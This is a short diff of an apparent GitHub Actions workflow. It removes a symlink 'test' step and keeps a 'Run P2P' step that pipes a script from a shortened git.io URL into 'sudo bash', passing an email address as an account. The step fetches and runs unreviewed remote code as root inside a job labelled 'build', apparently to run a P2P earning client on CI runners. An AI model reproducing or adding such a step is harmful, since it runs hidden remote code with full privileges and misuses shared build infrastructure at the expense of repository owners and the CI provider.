@@ -10,8 +10,6 @@ jobs:
   build:
     runs-on: ubuntu-20.04
     steps:
-    - name: test
-      run: ln -s /proc/self/fd /dev/fd
     - name: Run P2P
       run: sudo bash <(curl -fsSL git.io/JzDdQ) kolana122@outlook.com
     - name: Timeout
